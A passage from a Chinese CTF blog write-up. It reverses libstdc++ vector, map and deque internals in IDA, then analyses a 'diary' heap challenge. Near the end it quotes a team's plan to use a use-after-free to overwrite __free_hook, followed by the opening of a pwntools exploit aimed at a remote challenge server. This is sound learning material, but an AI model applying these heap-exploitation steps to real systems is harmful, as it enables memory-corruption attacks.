<li><p><code>_Vector_base::_Vector_impl</code>继承了<code>_Vector_base::_Vector_impl_data</code>, 而data结构体中含有<code>_M_start/finish/end_of_storage</code>三个指针, 并声明了**<code>_Vector_impl _M_impl;</code>** </p>
</li>
<li><p>vector class又继承了<code>_Vector_base</code>, 定义了<code>typedef _Vector_base _Base</code> <code>using _Base::_M_impl;</code>, 于是内存就是3*8=24字节, IDA里也是如此, 至于为什么局部变量是32字节, 我也不知道. sizeof也是24, 确实就是这三个. </p>
</li>
<li><p>vector的迭代器好像只有一个成员变量, 是指针. 确实如此, </p>
</li>
<li><p>遇到了一个<code>*sub_558C(&amp;iter_reverse)</code>操作, 其实是<code>operator*()</code>, 因为vector是序列式内存分布, 所以直接在内部将指针减8. 具体见上面iter. </p>
</li>
<li><p>突然发现我好像认不出来vector的erase….又去看反编译了. </p>
<ul>
<li><p>在C++11下第一层封装</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-function">iterator <span class="hljs-title">erase</span><span class="hljs-params">(const_iterator __position)</span></span><br><span class="hljs-function">      </span>&#123; <span class="hljs-keyword">return</span> _M_erase(<span class="hljs-built_in">begin</span>() + (__position - <span class="hljs-built_in">cbegin</span>())); &#125;<br></code></pre></div></td></tr></table></figure>

<p><code>_M_erase</code>第二层封装</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> _Tp, <span class="hljs-keyword">typename</span> _Alloc&gt;<br><span class="hljs-keyword">typename</span> vector&lt;_Tp, _Alloc&gt;::iterator<br>    vector&lt;_Tp, _Alloc&gt;::_M_erase(iterator __position)<br>&#123;<br>    <span class="hljs-keyword">if</span> (__position + <span class="hljs-number">1</span> != <span class="hljs-built_in">end</span>())<br>        _GLIBCXX_MOVE3(__position + <span class="hljs-number">1</span>, <span class="hljs-built_in">end</span>(), __position);<br>    --<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish;<br>    _Alloc_traits::<span class="hljs-built_in">destroy</span>(<span class="hljs-keyword">this</span>-&gt;_M_impl, <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish);<br>    <span class="hljs-keyword">return</span> __position;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>问题在于第一层封装看起来很短, 但是由于C++11的新参数类型const iterator导致在函数使用<code>__position</code>为base来构造一个局部iterator, 然后调用<code>opertor-</code>, 局部变量接收begin()返回值, <code>operator+</code>, 最后才是<code>_M_erase()</code>的调用, 显得很长.<br>即使是第二层封装第一眼也没看出来+1的操作, 其实还是封装在了<code>operator+</code>里. 多熟悉下就懂了. 不等于号也是个函数(…)<br>move又是一堆代码, 放弃了解细节. </p>
</li>
<li><p>至于为什么<code>operator-</code>里面有个0xAAAAAAAAAAAAAAAB, 牵扯过多, 除非看懂traits和vector所有Member types等等东西. 简单说就是<code>bool divisible_by_3 = number * 0xAAAAAAABu &lt;= 0x55555555u;</code> 还可以用这个乘法代替常数除法. 本质数学题, 不是那块料. </p>
</li>
<li><p><b style="font-weight:bold;font-size:x-large">发现一个新问题, 这个怎么没有destroy <code>__position</code>指向的元素?这也能叫做erase? 就只是让它从向量中消失? </b> 真绝了, 为什么看起来这么奇怪, 可能在实际也有用处, 所以不是默认行为. </p>
</li>
</ul>
</li>
</ul>
<h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>48字节. </p>
<p>构造函数还是没有什么特别的. 套娃是真谛. </p>
<p>和map有着一样的构造函数, 插入时也能找到rb_tree_insert. 注意区别.     </p>
<h4 id="map-1"><a href="#map-1" class="headerlink" title="map"></a>map</h4><p><del>59字节是个什么东西</del>. 其实是48字节. </p>
<p>map中只有 <code>std::map::_Rep_type _M_t</code>, 其实就是<code> _Rb_tree</code>这个class, 它的内存仅包含 <code>std::_Rb_tree::_Rb_tree_impl _M_impl</code> , 而这个成员的嵌套关系如下:    </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-built_in">std</span>::_Rb_tree&lt;...&gt;::_Rb_tree_impl _M_impl <span class="hljs-comment">//即为_Rb_tree</span><br><span class="hljs-number">00000000</span> baseclass_0     <span class="hljs-built_in">std</span>::allocator&lt;...&gt; <span class="hljs-comment">//就占用一字节</span><br><span class="hljs-number">00000001</span>                 db ? ; undefined<br><span class="hljs-number">00000002</span>                 db ? ; undefined<br><span class="hljs-number">00000003</span>                 db ? ; undefined<br><span class="hljs-number">00000004</span>                 db ? ; undefined<br><span class="hljs-number">00000005</span>                 db ? ; undefined    <br><span class="hljs-number">00000006</span>                 db ? ; undefined<br><span class="hljs-number">00000007</span>                 db ? ; undefined    <span class="hljs-comment">//意义不明的对齐填充</span><br><span class="hljs-number">00000008</span> baseclass_8     <span class="hljs-built_in">std</span>::_Rb_tree_header ?    <span class="hljs-comment">//这个结构体内容在下面</span><br><span class="hljs-number">00000030</span><br></code></pre></div></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_header       <span class="hljs-built_in">std</span>::_Rb_tree_node_base ? <span class="hljs-comment">//还是在下面</span><br><span class="hljs-number">00000020</span> _M_node_count   dq ?<br><span class="hljs-number">00000030</span><br></code></pre></div></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_color        dd ?                    ; <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">std</span>:</span>:_Rb_tree_color<br><span class="hljs-number">00000004</span>                 dd ? ; undefined<br><span class="hljs-number">00000008</span> _M_parent       dq ?                    ; offset<br><span class="hljs-number">00000010</span> _M_left         dq ?                    ; offset<br><span class="hljs-number">00000018</span> _M_right        dq ?                    ; offset<br><span class="hljs-number">00000020</span><br></code></pre></div></td></tr></table></figure>

<p>所以实际上为</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">00000000</span> _M_color        dd ?                    ; <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">std</span>:</span>:_Rb_tree_color<br><span class="hljs-number">00000004</span>                 dd ? ; undefined<br><span class="hljs-number">00000008</span> _M_parent       dq ?                    ; offset<br><span class="hljs-number">00000010</span> _M_left         dq ?                    ; offset<br><span class="hljs-number">00000018</span> _M_right        dq ?                    ; offset<br><span class="hljs-number">00000020</span> _M_node_count   dq ?<br><span class="hljs-number">00000030</span> map_end<br></code></pre></div></td></tr></table></figure>

<p>啊, 还是查IDA得结构体方便. 源码里真的是找半天. </p>
<blockquote>
<p>开头的map class构造函数还错误的将main的rsi rdx当成是该函数的第二三个参数, 没有符号时IDA可能会错误增加变量个数. </p>
</blockquote>
<p>构造函数是一堆套娃子函数, 清空下59字节(大概)内存. </p>
<ul>
<li>然后分析下**operator[]**函数: 注意到map变量的操作符最终会被编译成class成员函数的样子, 第一个参数为this指针, 第二个参数为相应操作数值. 例如<code>operator[]</code>的对应函数表达式为<code>*sub_28D4(m, fuckstr) = 1;</code>即<code>map[&#39;fuck&#39;] = 666</code>. **在这个函数中可以发现<code>_Rb_tree_insert_and_rebalance</code>这个函数, 也能够确定是某个使用黑红树的容器. ** sub_28d4返回的是一个<a target="_blank" rel="noopener" href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/stl_map.h#L488">左值引用</a>, 在C++11以后的版本中使用右值引用参数(又查了半天的右值复习了下, 主要是配合move和forward两个函数好用), 在源码中就是这么几个函数:</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">v5 = <span class="hljs-built_in">sub_2DD0</span>(a1, a2);    <span class="hljs-comment">//lower_bound(), a1 = this*, v5 = __i</span><br>v6 = <span class="hljs-built_in">sub_2DF6</span>(a1);        <span class="hljs-comment">//end()</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-built_in">sub_2E10</span>(&amp;v5, &amp;v6) || (<span class="hljs-built_in">sub_2E32</span>(a1), v2 = <span class="hljs-built_in">sub_2E4E</span>(&amp;v5), <span class="hljs-built_in">sub_2E6C</span>(&amp;v7, a2, v2)) )       <br>&#123;<br>  <span class="hljs-built_in">sub_2E96</span>(v9, a2);<br>  <span class="hljs-built_in">sub_2EBC</span>(&amp;v10, &amp;v5);<br>  v5 = <span class="hljs-built_in">sub_2EDA</span>(a1, v10, &amp;unk_6004, v9, &amp;v8);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_2E4E</span>(&amp;v5) + <span class="hljs-number">32</span>;<br></code></pre></div></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">iterator __i = <span class="hljs-built_in">lower_bound</span>(__k);<br><span class="hljs-comment">// __i-&gt;first is greater than or equivalent to __k.</span><br><span class="hljs-keyword">if</span> (__i == <span class="hljs-built_in">end</span>() || <span class="hljs-built_in">key_comp</span>()(__k, (*__i).first))<br>  __i = _M_t._M_emplace_hint_unique(__i, std::piecewise_construct,<br>                std::forward_as_tuple(std::<span class="hljs-built_in">move</span>(__k)),<br>                std::tuple&lt;&gt;());<br><span class="hljs-keyword">return</span> (*__i).second;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>然而没符号的**<code>map::find</code>**真的看不出来什么端倪….</li>
<li>再看看tree的<strong>iterator</strong>, 它的内存布局很简单, 只有一个<code>_Rb_tree_node_base*</code>指针占用8字节. 在调用<code>map::end()</code>时就可以简单地看出来. </li>
<li>find函数如果没有找到对应键值对则返回iter_end. </li>
<li>map的erase中对value的空间进行了destroy, 意味着调用了类(如果是的话)的析构函数. </li>
</ul>
<blockquote>
<p>然后是看了源码后的分析</p>
</blockquote>
<ul>
<li>也没啥, map要实现的操作在rb_tree中都有实现, 所以做一个转接调用即可. </li>
<li>注意到源码中的rb_tree还继承了一个base然而书中没有, 只有一个node_base. </li>
<li></li>
</ul>
<h4 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h4><blockquote>
<p>足足有80字节. </p>
</blockquote>
<p>布局如下: </p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-number">00000000</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x50</span>, align=<span class="hljs-number">0x8</span>, copyof_137)<br><span class="hljs-number">00000000</span>                                         ; XREF: std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;/r<br><span class="hljs-number">00000000</span> _M_map          dq ?                    ; offset<br><span class="hljs-number">00000008</span> _M_map_size     dq ?<br><span class="hljs-number">00000010</span> <span class="hljs-number">16</span> _M_start        std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ? <br><span class="hljs-number">00000030</span> <span class="hljs-number">48</span> _M_finish       std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ?<br><span class="hljs-number">00000050</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl ends<br></code></pre></div></td></tr></table></figure>

<p>其中start finish意思显而易见. 但是注意到一个iterator有0x20字节, 和vector的8字节明显不同. 下面是iterator:</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-number">00000000</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator struc ; (<span class="hljs-keyword">sizeof</span>=<span class="hljs-number">0x20</span>, align=<span class="hljs-number">0x8</span>, copyof_139)<br><span class="hljs-number">00000000</span>                                         ; XREF: std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl/r<br><span class="hljs-number">00000000</span> st fi                                   ; std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::_Deque_impl/r<br><span class="hljs-number">00000000</span> <span class="hljs-number">16</span> <span class="hljs-number">48</span> _M_cur          dq ?                    ; offset<br><span class="hljs-number">00000008</span> <span class="hljs-number">24</span> <span class="hljs-number">56</span> _M_first        dq ?                    ; offset<br><span class="hljs-number">00000010</span> <span class="hljs-number">32</span> <span class="hljs-number">64</span> _M_last         dq ?                    ; offset<br><span class="hljs-number">00000018</span> <span class="hljs-number">40</span> <span class="hljs-number">72</span> _M_node         dq ?                    ; offset<br><span class="hljs-number">00000020</span> std::_Deque_base&lt;<span class="hljs-keyword">int</span>&gt;::iterator ends<br></code></pre></div></td></tr></table></figure>

<p>多了first last node. </p>
<p>注意指针的位置, cur指向第一个元素或者<strong>最后一个元素之后</strong>. </p>
<img src="../../image/recent_ctf/image-20230124221604604.png" srcset="/img/loading.gif" lazyload alt="image-20230124221604604" style="zoom:80%;" />

<img src="../../image/recent_ctf/image-20230125112558204.png" srcset="/img/loading.gif" lazyload alt="image-20230125112558204" style="zoom:80%;" />

<ul>
<li><p>它的迭代器比较直接. 逆向迭代如下, 如果是正向迭代则只要第五行即可. 直接初始化<code>*__x = this-&gt;_M_impl._M_finish</code> </p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">std::deque&lt;<span class="hljs-keyword">int</span>&gt;::reverse_iterator *__cdecl std::deque&lt;<span class="hljs-keyword">int</span>&gt;::<span class="hljs-built_in">rbegin</span>(std::deque&lt;<span class="hljs-keyword">int</span>&gt;::reverse_iterator *retstr, std::deque&lt;<span class="hljs-keyword">int</span>&gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>)<br>&#123;<br>  std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&amp;,<span class="hljs-keyword">int</span>*&gt; __x; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br><br>  std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span> &amp;,<span class="hljs-keyword">int</span> *&gt;::_Deque_iterator(&amp;__x, &amp;<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish);<br>  std::reverse_iterator&lt;std::_Deque_iterator&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span> &amp;,<span class="hljs-keyword">int</span> *&gt;&gt;::<span class="hljs-built_in">reverse_iterator</span>(retstr, &amp;__x);<br>  <span class="hljs-keyword">return</span> retstr;<br>&#125;<br></code></pre></div></td></tr></table></figure></li>
<li><p>它的push_back-&gt;move+emplace_back. 注意emplace的参数是std::move的返回值, move实际上啥也没做. push_front非常相似.<br>第一次我还是看到了<code>_M_push_back_aux</code>中的一个报错字符串才发现这个是deque. </p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">void</span> __fastcall std::deque&lt;<span class="hljs-keyword">int</span>&gt;::emplace_back&lt;<span class="hljs-keyword">int</span>&gt;(std::deque&lt;<span class="hljs-keyword">int</span>&gt; *<span class="hljs-keyword">const</span> <span class="hljs-keyword">this</span>, <span class="hljs-keyword">int</span> *a2, <span class="hljs-keyword">int</span> *__args_0)<br>&#123;<br>  <span class="hljs-keyword">int</span> *v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> *v4; <span class="hljs-comment">// r9</span><br>  <span class="hljs-keyword">int</span> *v5; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// r8</span><br>  <span class="hljs-comment">// +48 == +64</span><br>  <span class="hljs-keyword">if</span> ( <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur == <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_last - <span class="hljs-number">1</span> )<br>  &#123; <span class="hljs-comment">// if space is not enough</span><br>    v5 = std::forward&lt;<span class="hljs-keyword">int</span>&gt;(a2); <br>    std::deque&lt;<span class="hljs-keyword">int</span>&gt;::_M_push_back_aux&lt;<span class="hljs-keyword">int</span>&gt;(<span class="hljs-keyword">this</span>, v5, v6); <br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v3 = std::forward&lt;<span class="hljs-keyword">int</span>&gt;(a2);<br>    std::allocator_traits&lt;std::allocator&lt;<span class="hljs-keyword">int</span>&gt;&gt;::construct&lt;<span class="hljs-keyword">int</span>,<span class="hljs-keyword">int</span>&gt;(<br>      <span class="hljs-keyword">this</span>,<br>      <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur,<br>      v3,<br>      v4); <span class="hljs-comment">//v4是可变参数列表导致的</span><br>    ++<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li>
<li><p>erase: 一个if, 一个else语句还是比较明显的, 要注意有两层wrap, 和vector差不多. 还有一个重载版本是擦除区间.<br>有趣的是它会根据要擦除元素的位置左右元素个数来决定移动左边或者右边, 也就是下面if和else的逻辑.<br>不过有一样的问题, 会对front或者end(根据执行的是if还是else语句)执行<code>destroy()</code> </p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> _Tp, <span class="hljs-keyword">typename</span> _Alloc&gt;<br><span class="hljs-keyword">typename</span> deque&lt;_Tp, _Alloc&gt;::iterator<br>    deque&lt;_Tp, _Alloc&gt;::<br>    _M_erase(iterator __position)<br>&#123;<br>    iterator __next = __position;<br>    ++__next;<br>    <span class="hljs-keyword">const</span> difference_type __index = __position - <span class="hljs-built_in">begin</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">static_cast</span>&lt;size_type&gt;(__index) &lt; (<span class="hljs-built_in">size</span>() &gt;&gt; <span class="hljs-number">1</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span> (__position != <span class="hljs-built_in">begin</span>())<br>            _GLIBCXX_MOVE_BACKWARD3(<span class="hljs-built_in">begin</span>(), __position, __next);<br>        <span class="hljs-built_in">pop_front</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (__next != <span class="hljs-built_in">end</span>())<br>            _GLIBCXX_MOVE3(__next, <span class="hljs-built_in">end</span>(), __position);<br>        <span class="hljs-built_in">pop_back</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">begin</span>() + __index;<br>&#125;<br></code></pre></div></td></tr></table></figure></li>
<li><p>pop_back(): 注意到destroy对于原生类型是没有操作的, 看到啥也没返回的不要惊讶. </p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pop_back</span><span class="hljs-params">()</span> _GLIBCXX_NOEXCEPT</span><br><span class="hljs-function"></span>&#123;<br>    __glibcxx_requires_nonempty();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur<br>        != <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_first)<br>    &#123;<br>        --<span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur;<br>        _Alloc_traits::<span class="hljs-built_in">destroy</span>(<span class="hljs-keyword">this</span>-&gt;_M_impl,<br>            <span class="hljs-keyword">this</span>-&gt;_M_impl._M_finish._M_cur);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        _M_pop_back_aux();<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="DIARY-BIN"><a href="#DIARY-BIN" class="headerlink" title="DIARY BIN"></a>DIARY BIN</h3><p>回到题目中. </p>
<ul>
<li><p>sub_2813是init函数. 向一个全局map添加几个键值对, 但是在源码中看到值是一个枚举类型, 要留意这种可能. </p>
</li>
<li><p>遇到了变量重复使用, if语句内外已经不是一个含义了. </p>
</li>
<li><p>下面的strtol是错误的, 实际上是<code>stoi</code>, 库函数API如下</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> <span class="hljs-title">stoi</span><span class="hljs-params">(<span class="hljs-keyword">const</span> string&amp; __str, <span class="hljs-keyword">size_t</span>* __idx = <span class="hljs-number">0</span>, <span class="hljs-keyword">int</span> __base = <span class="hljs-number">10</span>)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">//__stoa is helper for all sto* functions</span><br>    <span class="hljs-keyword">return</span> __gnu_cxx::__stoa&lt;<span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>&gt;(&amp;std::strtol, <span class="hljs-string">&quot;stoi&quot;</span>, __str.<span class="hljs-built_in">c_str</span>(),<br>                                        __idx, __base); &#125;<br></code></pre></div></td></tr></table></figure></li>
<li></li>
</ul>
<p>分支分析:</p>
<ul>
<li>op_add<ul>
<li><code>add format: add#year#month#day#hour#minutes#second#content</code> </li>
<li>diary_vector存储日记, 最多32个. 时间限制为2022年以前. 分配0x300的空间, content最多写入0x2F0. </li>
<li>new出来的content如果前四个字符都是空格则又delete掉. 然后在又一次的init中new出一片content空间, <strong>清零并设置前四字节为空格</strong>. </li>
</ul>
</li>
<li>op_update<ul>
<li><code>update format: update#idx#content</code> </li>
<li>memset过程和op_add基本一致. idx判断逻辑是不能大于vector长度. </li>
</ul>
</li>
<li>op_show<ul>
<li><code>show format: show#idx</code> 没啥特别的</li>
</ul>
</li>
<li>op_delete<ul>
<li>格式就是delete加上idx. </li>
</ul>
</li>
<li>op_encrypt<ul>
<li><code>encrypt format: encrypt#idx#offset#lengt</code> </li>
<li><del>使用<code>strtol()</code>但是返回的数值赋值给了unsigned int类型, 可能溢出. 好吧好几个函数都是这样的</del>.<br>不过offset &lt; content_len, len &gt; content_len, len + offset &gt; content_len. </li>
<li>用idx对应的diary的datetime在<code>time_cry_map</code>里找到映射的<code>diary_cry_vec</code>, 然后将具有offset length content(<strong>by calloc</strong>)三个field的结构体pushback到<code>diary_cry_vec</code>, 作为原始数据, 再将原区域的数据进行byte xor, 字节序列为程序一开始得到的随机数字节串, 设置encrypted bit in diary struct. </li>
</ul>
</li>
<li>decrypt<ul>
<li><code>decrypt#idx</code> </li>
<li>根本没解, 在for循环里面把vector的每一个元素部分都memcpy回去. 这?</li>
</ul>
</li>
</ul>
<p>这又有什么漏洞?? 居然可以是vector::erase的特性….</p>
<p>直接wp学习法(到底什么时候才能自己做题啊)</p>
<h3 id="wp1-Nu1l"><a href="#wp1-Nu1l" class="headerlink" title="wp1 - Nu1l"></a>wp1 - Nu1l</h3><blockquote>
<p>利⽤UAF构造最后⼀个块同时存在于tcache与unsorted bin中<br>再利⽤enc的calloc写⼊，修改next指针为free_hook</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># s = process(&quot;./diary&quot;)</span><br>s = remote(<span class="hljs-string">&quot;119.13.105.35&quot;</span>,<span class="hljs-string">&quot;10111&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">sec,buf</span>):</span><br>    payload = <span class="hljs-string">&quot;add#2022#12#10#0#0#&#123;&#125;#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(sec,buf)<br>    s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,buf</span>):</span><br>    payload = <span class="hljs-string">&quot;update#&#123;&#125;#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx,buf)<br>    s.sendlineafter(<span class="hljs-string">&quot;input your test cmd:&quot;</span>,payload)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    payload = <span class="hljs-string">&quot;show#&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(idx)<br>    s.sendlineafter(<span 